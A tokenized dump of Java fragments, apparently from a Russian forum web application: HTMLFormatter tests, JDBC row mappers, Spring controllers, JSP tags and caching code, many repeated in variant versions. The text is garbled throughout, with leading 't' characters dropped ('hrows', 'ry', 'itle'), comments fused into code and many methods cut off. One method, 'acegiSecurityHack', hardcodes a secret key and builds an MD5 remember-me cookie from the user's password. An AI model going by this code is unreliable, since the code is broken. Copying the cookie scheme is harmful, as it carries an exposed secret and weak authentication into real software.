public void estCyrillicLink ( ) { HTMLFormatter formatter = new HTMLFormatter ( CYR_LINK ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public void estGoogleCache ( ) { HTMLFormatter formatter = new HTMLFormatter ( GOOGLE_CACHE ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public void estPreformatLong1 ( ) { HTMLFormatter formatter = new HTMLFormatter ( PREFORMAT_LONG_TEST1 ) ; formatter . enableUrlHighLightMode ( ) ; formatter . enablePreformatMode ( ) ; String s = formatter . process ( ) ; assertEquals ( " Long line damaged in preformat mode " , PREFORMAT_LONG_RESULT1 , s ) ; } 
public void estPreformatLong2 ( ) { HTMLFormatter formatter = new HTMLFormatter ( PREFORMAT_LONG_TEST2 ) ; formatter . enablePreformatMode ( ) ; String s = formatter . process ( ) ; assertEquals ( " Long line damaged in preformat mode " , PREFORMAT_LONG_RESULT2 , s ) ; } 
public static int countCharacters ( String str ) hrows UtilException { int size = 0 ; ry { for ( Iterator < String > i = new SGMLStringIterator ( str ) ; i . hasNext ( ) ; ) { i . next ( ) ; size + + ; } } catch ( StringIndexOutOfBoundsException ex ) { hrow new UtilException ( " Invalid SGML Entity " ) ; } return size ; } 
public String next ( ) { if ( ! hasNext ( ) ) { hrow new NoSuchElementException ( ) ; } if ( str . charAt ( index ) = = '&' ) { StringBuffer buf = new StringBuffer ( ) ; 
private boolean isAjax ( HttpServletRequest request ) { String header = request . getHeader ( " X-Requested-With " ) ; return header ! = null & & " XMLHttpRequest " . equals ( header ) ; } 
public static boolean isBox ( String name ) { return boxSet . contains ( name ) ; } 
public String getContentImpl ( ProfileHashtable profile ) hrows SQLException , BadDateException { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public String getContentImpl ( ProfileHashtable profile ) hrows SQLException { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public void estURLWithAt ( ) { HTMLFormatter formatter = new HTMLFormatter ( URL_WITH_AT ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = " ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE " ; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(new Long(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any } 
public void estEntityCrash ( ) { HTMLFormatter formatter = new HTMLFormatter ( GUARANTEED_CRASH ) ; formatter . enablePreformatMode ( ) ; formatter . enableUrlHighLightMode ( ) ; ry { String r = formatter . process ( ) ; 
public void estUndescore ( ) { HTMLFormatter formatter = new HTMLFormatter ( LINK_WITH_UNDERSCORE ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " </a> " ) ) ; } 
public void estWithParamOnly ( ) { HTMLFormatter formatter = new HTMLFormatter ( LINK_WITH_PARAM_ONLY ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " </a> " ) ) ; } 
public void estWithCyrillic ( ) { HTMLFormatter formatter = new HTMLFormatter ( RFC1738 ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " </a> " ) ) ; } 
public void estNlSubstition ( ) { String s = HTMLFormatter . nl2br ( " This is a line nwith break inside it " ) ; Integer i = s . indexOf ( " <br> " ) ; assertThat ( " Newline is changed to <br> " , i , CoreMatchers . not ( - 1 ) ) ; } 
public void estStringEscape ( ) { String str = " This is an entity &#1999; " ; String s = HTMLFormatter . htmlSpecialChars ( str ) ; assertThat ( " String should remaint unescaped " , s , CoreMatchers . equalTo ( str ) ) ; } 
public void estAmpEscape ( ) { String str = " a&b " ; String s = HTMLFormatter . htmlSpecialChars ( str ) ; assertThat ( " Ampersand should be escaped " , s , CoreMatchers . equalTo ( " a&amp;b " ) ) ; } 
public void estParaSubstition ( ) { String str = " his is a line r rwith some nlinebreaks in it " ; String s = HTMLFormatter . exnl2br ( str , false ) ; Integer i = s . indexOf ( " <p> " ) ; assertThat ( " Newlines is changed to <p> " , i , CoreMatchers . not ( - 1 ) ) ; Integer b = s . indexOf ( " <p> " , i + 3 ) ; assertThat ( " Wait, there should be two paras " , b , CoreMatchers . not ( - 1 ) ) ; } 
public void estCyrillicLink ( ) { HTMLFormatter formatter = new HTMLFormatter ( CYR_LINK ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public void estGoogleCache ( ) { HTMLFormatter formatter = new HTMLFormatter ( GOOGLE_CACHE ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public void estPreformatLong1 ( ) { HTMLFormatter formatter = new HTMLFormatter ( PREFORMAT_LONG_TEST1 ) ; formatter . enableUrlHighLightMode ( ) ; formatter . enablePreformatMode ( ) ; String s = formatter . process ( ) ; assertEquals ( " Long line damaged in preformat mode " , PREFORMAT_LONG_RESULT1 , s ) ; } 
public void estPreformatLong2 ( ) { HTMLFormatter formatter = new HTMLFormatter ( PREFORMAT_LONG_TEST2 ) ; formatter . enablePreformatMode ( ) ; String s = formatter . process ( ) ; assertEquals ( " Long line damaged in preformat mode " , PREFORMAT_LONG_RESULT2 , s ) ; } 
public void estURLWithAt ( ) { HTMLFormatter formatter = new HTMLFormatter ( URL_WITH_AT ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public void estLatin1Supplement ( ) { HTMLFormatter formatter = new HTMLFormatter ( Latin1Supplement ) ; formatter . enableUrlHighLightMode ( ) ; String s2 = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s2 . endsWith ( " </a> " ) ) ; } 
public void estGreek ( ) { HTMLFormatter formatter = new HTMLFormatter ( greek ) ; formatter . enableUrlHighLightMode ( ) ; String s2 = formatter . process ( ) ; System . out . println ( s2 ) ; assertTrue ( " All text should be inside link " , s2 . endsWith ( " </a> " ) ) ; } 
public void estGreek ( ) { HTMLFormatter formatter = new HTMLFormatter ( greek ) ; formatter . enableUrlHighLightMode ( ) ; String s2 = formatter . process ( ) ; assertTrue ( " All text should be inside link " , s2 . endsWith ( " </a> " ) ) ; } 
public String getContent ( ProfileHashtable profileHashtable ) hrows IOException , SQLException { Connection db = null ; StringWriter writer = new StringWriter ( ) ; ry { db = LorDataSource . getConnection ( ) ; Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT topics.id as msgid, topics.stat1, topics.title, topics.url, " + " topics.linktext, nick FROM topics, sections, groups, users WHERE groups.id=topics.groupid " + " AND groups.section=sections.id AND users.id=topics.userid AND topics.moderate AND sections.id=3 AND NOT deleted " + " ORDER BY commitdate DESC LIMIT 3 " ) ; Vector < GalleryItem > items = new Vector < GalleryItem > ( ) ; while ( rs . next ( ) ) { GalleryItem item = createGalleryItem ( rs ) ; items . add ( item ) ; } ry { VelocityEngine ve = new VelocityEngine ( ) ; ve . init ( ) ; VelocityContext vc = new VelocityContext ( ) ; vc . put ( " items " , items ) ; todo: template loader ve.mergeTemplate("gallery.vm", "UTF-8", vc, writer); } catch (Exception e) { log.error(e); } } finally { if (db != null) { db.close(); } } return writer.toString(); } 
private GalleryItem createGalleryItem ( ResultSet rs ) hrows SQLException , IOException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setUrl ( " url " ) ; item . setIcon ( " linktext " ) ; item . setNick ( " nick " ) ; String htmlPath = ( ( PropertiesConfig ) config ) . getProperties ( ) . getProperty ( " HTMLPathPrefix " ) ; ry { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } return item ; } 
protected VelocityEngine getEngine ( ) hrows Exception { Properties p = new Properties ( ) ; p . setProperty ( " resource.loader " , " class " ) ; p . setProperty ( " class.resource.loader.class " , " org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader " ) ; VelocityEngine ve = new VelocityEngine ( ) ; ve . init ( p ) ; return ve ; } 
public String getContentImpl ( ProfileHashtable profileHashtable ) hrows IOException , SQLException { Connection db = null ; StringWriter writer = new StringWriter ( ) ; ry { db = LorDataSource . getConnection ( ) ; Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT topics.id as msgid, topics.stat1, topics.title, topics.url, " + " topics.linktext, nick FROM topics, sections, groups, users WHERE groups.id=topics.groupid " + " AND groups.section=sections.id AND users.id=topics.userid AND topics.moderate AND sections.id=3 AND NOT deleted " + " ORDER BY commitdate DESC LIMIT 3 " ) ; Vector < GalleryItem > items = new Vector < GalleryItem > ( ) ; while ( rs . next ( ) ) { GalleryItem item = createGalleryItem ( rs ) ; items . add ( item ) ; } ry { VelocityEngine ve = getEngine ( ) ; VelocityContext vc = new VelocityContext ( ) ; vc . put ( " items " , items ) ; ve . mergeTemplate ( " /templates/boxlets/gallery.vm " , " UTF-8 " , vc , writer ) ; } catch ( Exception e ) { log . error ( e ) ; } } finally { if ( db ! = null ) { db . close ( ) ; } } return writer . oString ( ) ; } 
private GalleryItem createGalleryItem ( ResultSet rs ) hrows SQLException , IOException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; String htmlPath = ( ( PropertiesConfig ) config ) . getProperties ( ) . getProperty ( " HTMLPathPrefix " ) ; ry { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( FileNotFoundException e ) { log . error ( e ) ; } return item ; } 
public String getContent ( ProfileHashtable profile ) hrows IOException , SQLException { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public int doEndTag ( ) hrows JspException { todo: after rw boxlets as Spring controllers, add here, depending on object value try { pageContext.include("/gallery.boxlet"); } catch (ServletException e) { e.printStackTrace(); To change body of catch statement use File | Settings | File Templates. } catch (IOException e) { e.printStackTrace(); To change body of catch statement use File | Settings | File Templates. } return SKIP_BODY; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return createGalleryItem ( rs ) ; } 
private GalleryItem createGalleryItem ( ResultSet rs ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; String htmlPath = properties . getProperties ( ) . getProperty ( " HTMLPathPrefix " , " " ) ; ry { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } log . debug ( ToStringBuilder . reflectionToString ( item ) ) ; return item ; } 
public static Poll createPoll ( Integer id , String itle , Integer opic ) { return new Poll ( id , itle , opic ) ; } 
public ArchiveDTO mapRow ( ResultSet rs , int rowNum ) hrows SQLException { ArchiveDTO dto = new ArchiveDTO ( ) ; dto . setYear ( rs . getInt ( " year " ) ) ; dto . setMonth ( rs . getInt ( " month " ) ) ; dto . setCount ( rs . getInt ( " c " ) ) ; return dto ; } 
private void doMarkForShow ( int anInt ) { emplate . update ( " insert into boxlet_show(topic_id) values (?) " , anInt ) ; } 
public Poll getCurrentPoll ( ) hrows PollNotFoundException { String sql = " SELECT votenames.id, votenames.title, votenames.topic FROM votenames " + " JOIN topics on votenames.topic = topics.id WHERE " + " topics.moderate AND not topics.deleted " + " AND topics.commitdate = (select max(commitdate) " + " from topics where groupid=19387 AND moderate AND NOT deleted) " ; Poll result = jdbcTemplate . queryForObject ( sql , new ParameterizedRowMapper < Poll > ( ) { public Poll mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return Poll . createPoll ( rs . getInt ( " id " ) , rs . getString ( " itle " ) , rs . getInt ( " opic " ) ) ; } } , new HashMap ( ) ) ; if ( result = = null ) { hrow new PollNotFoundException ( - 1 ) ; } return result ; } 
public Poll mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return Poll . createPoll ( rs . getInt ( " id " ) , rs . getString ( " itle " ) , rs . getInt ( " opic " ) ) ; } 
public VoteDTO mapRow ( ResultSet rs , int rowNum ) hrows SQLException { VoteDTO dto = new VoteDTO ( ) ; dto . setId ( rs . getInt ( " id " ) ) ; dto . setLabel ( rs . getString ( " label " ) ) ; dto . setPollId ( pollId ) ; return dto ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return createGalleryItem ( rs ) ; } 
public void execute ( Object o ) { TopTenDaoImpl . TopTenMessageDTO dto = ( TopTenDaoImpl . TopTenMessageDTO ) o ; dto . setPages ( ( int ) Math . ceil ( dto . getAnswers ( ) / itemsPerPage ) ) ; } 
public TopTenMessageDTO mapRow ( ResultSet rs , int i ) hrows SQLException { TopTenMessageDTO result = new TopTenMessageDTO ( ) ; result . setMsgid ( rs . getInt ( " msgid " ) ) ; result . setTitle ( rs . getString ( " itle " ) ) ; result . setLastmod ( rs . getTimestamp ( " lastmod " ) ) ; result . setAnswers ( rs . getInt ( " c " ) ) ; Integer savedOrder = rs . getInt ( " mess_order " ) ; result . setMovedUp ( savedOrder = = null | | i > savedOrder ) ; return result ; } 
public boolean isMovedUp ( ) { return movedUp ; } 
public static List < Group > getGroups ( Connection db , Section section ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, imagepost, vote, section, havelink, linktext, sections.name as sname, title, image, restrict_topics, restrict_comments, stat1,stat2,stat3,groups.id,groups.info FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) hrows SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; itle = rs . getString ( " itle " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; restrictComments = rs . getInt ( " restrict_comments " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; } 
public String show ( Connection db ) hrows IOException , SQLException , UtilException , UserErrorException { StringBuilder buf = new StringBuilder ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( ag ! = null & & ! " " . equals ( ag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " ) ; pst . setString ( 1 , ag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int agid = rs . getInt ( " id " ) ; if ( agid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( agid ) . append ( ')' ) ; } } else { hrow new UserErrorException ( " Tag not found " ) ; } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, groups.id as guid, " + " opics.url, topics.linktext, imagepost, vote, sections.name as pname, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, bbcode, sections.id as section, NOT topics.sticky AS ssticky " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where + ' ' + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . oString ( ) ; } 
public TopTenMessageDTO mapRow ( ResultSet rs , int i ) hrows SQLException { TopTenMessageDTO result = new TopTenMessageDTO ( ) ; result . setMsgid ( rs . getInt ( " msgid " ) ) ; result . setTitle ( rs . getString ( " itle " ) ) ; result . setLastmod ( rs . getTimestamp ( " lastmod " ) ) ; result . setAnswers ( rs . getInt ( " c " ) ) ; Integer savedOrder = rs . getInt ( " mess_order " ) ; if ( rs . wasNull ( ) ) { savedOrder = null ; } result . setMovedUp ( savedOrder = = null | | ( i + 1 ) > savedOrder ) ; return result ; } 
public TagDTO mapRow ( ResultSet rs , int rowNum ) hrows SQLException { TagDTO result = new TagDTO ( ) ; result . setValue ( rs . getString ( " value " ) ) ; final double counter = Math . log ( rs . getInt ( " counter " ) ) ; result . setCounter ( counter ) ; if ( maxc . doubleValue ( ) < counter ) { maxc . setValue ( counter ) ; } if ( minc . doubleValue ( ) < 0 | | counter < minc . doubleValue ( ) ) { minc . setValue ( counter ) ; } return result ; } 
public void execute ( Object o ) { TagDTO ag = ( TagDTO ) o ; ag . setWeight ( ( int ) Math . round ( 10 * ( ag . getCounter ( ) - minc . doubleValue ( ) ) / ( maxc . doubleValue ( ) - minc . doubleValue ( ) ) ) ) ; 
protected ModelAndView handleRequestInternal ( HttpServletRequest request , HttpServletResponse response ) hrows Exception { String nick = new ServletParameterParser ( request ) . getString ( " nick " ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public int doStartTag ( ) hrows JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; String s = getObject ( ) ; if ( StringUtils . isEmpty ( s ) ) { s = " main2 " ; } @SuppressWarnings ( " unchecked " ) List < String > boxnames = ( List < String > ) . getProf ( ) . getObject ( s ) ; CollectionUtils . forAllDo ( boxnames , new Closure ( ) { public void execute ( Object o ) { String s = ( String ) o ; s = String . format ( " /%s.boxlet " , s ) ; } } ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public void execute ( Object o ) { String s = ( String ) o ; s = String . format ( " /%s.boxlet " , s ) ; } 
public int doEndTag ( ) hrows JspException { pageContext . removeAttribute ( var ) ; return SKIP_BODY ; } 
public int doStartTag ( ) hrows JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; String s = getObject ( ) ; if ( StringUtils . isEmpty ( s ) ) { s = " main2 " ; } @SuppressWarnings ( " unchecked " ) List < String > boxnames = ( List < String > ) . getProf ( ) . getObject ( s ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
protected ModelAndView edit ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView loginForm ( HttpServletRequest request , HttpServletResponse response ) hrows Exception { return new ModelAndView ( " login-form " ) ; } 
public ModelAndView doLogin ( HttpServletRequest request , HttpServletResponse response ) hrows Exception { Connection db = null ; Template mpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; boolean ajax = isAjax ( request ) ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView register ( ) hrows Exception { return new ModelAndView ( " register " ) ; } 
public ModelAndView doRegister ( HttpServletRequest request ) hrows Exception { HttpSession session = request . getSession ( ) ; Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { boolean changeMode = " update " . equals ( request . getParameter ( " mode " ) ) ; 
public ModelAndView handleRequestInternal ( @RequestParam ( " section " ) int sectionid ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
protected ModelAndView getTags ( ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView getInfo ( @RequestParam ( " nick " ) String nick ) hrows SQLException , UserNotFoundException { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView register ( ) { return new ModelAndView ( " register " ) ; } 
public ModelAndView doRegister ( HttpServletRequest request ) hrows Exception { HttpSession session = request . getSession ( ) ; Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { boolean changeMode = " change " . equals ( request . getParameter ( " mode " ) ) ; 
public ModelAndView view ( HttpServletRequest request ) hrows AccessViolationException , UtilException { boolean isThreeColumn = getThreeColumns ( request ) ; ModelAndView result = new ModelAndView ( " edit-boxes " ) ; result . addObject ( " isThreeColumn " , isThreeColumn ) ; return result ; } 
public ModelAndView showRemove ( HttpServletRequest request , @RequestParam ( required = rue ) String ag , @RequestParam ( required = rue ) Integer pos ) hrows AccessViolationException , UtilException { ModelAndView result = new ModelAndView ( " remove-box " ) ; result . addObject ( " ag " , ag ) ; result . addObject ( " pos " , pos ) ; return result ; } 
public void doRemove ( HttpServletRequest request , HttpServletResponse response ) hrows IOException { todo response.sendRedirect("/edit-boxes.jsp"); } 
public ModelAndView showRemove ( @RequestParam ( required = rue ) String ag , @RequestParam ( required = rue ) Integer pos ) hrows AccessViolationException , UtilException { log . debug ( " showRemove() " ) ; ModelAndView result = new ModelAndView ( " remove-box " ) ; EditBoxesForm form = new EditBoxesForm ( ) ; form . setPosition ( pos ) ; form . setTag ( ag ) ; result . addObject ( " form " , form ) ; return result ; } 
private GalleryItem createGalleryItem ( ResultSet rs ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; String htmlPath = properties . getProperties ( ) . getProperty ( " HTMLPathPrefix " , " " ) ; ry { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public boolean supports ( Class clazz ) { return EditBoxesController . EditBoxesForm . class . isAssignableFrom ( clazz ) ; } 
public int doStartTag ( ) hrows JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; String s = getObject ( ) ; if ( StringUtils . isEmpty ( s ) ) { s = " main2 " ; } @SuppressWarnings ( " unchecked " ) List < String > boxnames = ( List < String > ) . getProf ( ) . getObject ( s ) ; CollectionUtils . filter ( boxnames , new Predicate ( ) { public boolean evaluate ( Object o ) { String s = ( String ) o ; return mkdefprofile . isBox ( s ) ; } } ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public boolean evaluate ( Object o ) { String s = ( String ) o ; return mkdefprofile . isBox ( s ) ; } 
public ModelMap showRemove ( @RequestParam String ag , @RequestParam ( required = false ) Integer pos ) hrows AccessViolationException , UtilException { ModelMap result = new ModelMap ( ) ; EditBoxesForm form = new EditBoxesForm ( ) ; form . setPosition ( pos ) ; form . setTag ( ag ) ; result . addAttribute ( " form " , form ) ; return result ; } 
private void checkUserPassword ( EditBoxesForm form , BindingResult result , final Template ) { final DataSource ds = ( DataSource ) getApplicationContext ( ) . getBean ( " datasource " ) ; ry { User user = User . getUser ( ds . getConnection ( ) , . getProfileName ( ) ) ; 
public boolean supports ( Class clazz ) { return AddRemoveBoxesController . EditBoxesForm . class . isAssignableFrom ( clazz ) ; } 
public int doStartTag ( ) hrows JspException { log . debug ( " Key is " + getKey ( ) ) ; String cached = provider . getFromCache ( getKey ( ) ) ; foundInCache = cached ! = null ; if ( foundInCache ) { ry { log . debug ( " Found cached item: " + cached ) ; pageContext . getOut ( ) . write ( cached ) ; } catch ( IOException e ) { log . error ( e ) ; } return SKIP_BODY ; } else { log . debug ( " Cache miss. Will store after... " ) ; } return EVAL_BODY_BUFFERED ; } 
public int doAfterBody ( ) hrows JspException { if ( ! foundInCache ) { log . debug ( " Content was not found in cache. Will store it " ) ; if ( bodyContent ! = null ) { String result = bodyContent . getString ( ) ; provider . storeToCache ( getKey ( ) , result , getExpire ( ) ) ; ry { log . debug ( " Writing result: " + result . length ( ) ) ; bodyContent . clearBody ( ) ; bodyContent . write ( result ) ; bodyContent . writeOut ( bodyContent . getEnclosingWriter ( ) ) ; } catch ( IOException e ) { log . error ( e ) ; } } } return SKIP_BODY ; } 
public < T > T getFromCache ( String key ) ; public < T > boolean storeToCache ( String key , T value , long expire ) ; } 
public < T > boolean storeToCache ( String key , T value , long expire ) ; } 
public < T > boolean storeToCache ( String key , T value , long expire ) { String s = MemCachedSettings . getId ( key ) ; Date now = new Date ( ) ; return MemCachedSettings . getClient ( ) . add ( s , value , new Date ( now . getTime ( ) + expire ) ) ; } 
public int doStartTag ( ) hrows JspException { String cached = provider . getFromCache ( getKey ( ) ) ; foundInCache = cached ! = null ; if ( foundInCache ) { ry { pageContext . getOut ( ) . write ( cached ) ; } catch ( IOException e ) { log . error ( e ) ; } return SKIP_BODY ; } return EVAL_BODY_BUFFERED ; } 
public int doAfterBody ( ) hrows JspException { if ( ! foundInCache ) { if ( bodyContent ! = null ) { String result = bodyContent . getString ( ) ; provider . storeToCache ( getKey ( ) , result , getExpire ( ) ) ; ry { bodyContent . clearBody ( ) ; bodyContent . write ( result ) ; bodyContent . writeOut ( bodyContent . getEnclosingWriter ( ) ) ; } catch ( IOException e ) { log . error ( e ) ; } } } return SKIP_BODY ; } 
public ModelAndView opics ( @RequestParam ( " group " ) int groupId , HttpServletRequest request ) hrows Exception { return opics ( groupId , request , false ) ; } 
public ModelAndView opicsLastmod ( @RequestParam ( " group " ) int groupId , HttpServletRequest request ) hrows Exception { return opics ( groupId , request , rue ) ; } 
public static DateFormat createShort ( ) { return DateFormat . getDateTimeInstance ( DateFormat . MEDIUM , DateFormat . SHORT , RUSSIAN_LOCALE ) ; } 
public static DateFormat createShort ( ) { return new SimpleDateFormat ( " dd.MM.yyyy HH:mm " ) ; } 
public static DateFormat createTime ( ) { return new SimpleDateFormat ( " HH:mm " ) ; } 
public ModelAndView delIp ( HttpServletRequest request ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Map < Integer , String > deleted = new HashMap < Integer , String > ( ) ; Template mpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView delIp ( HttpServletRequest request , @RequestParam ( " reason " ) String reason , @RequestParam ( " ip " ) String ip , @RequestParam ( " ime " ) String ime ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Map < Integer , String > deleted = new HashMap < Integer , String > ( ) ; Template mpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
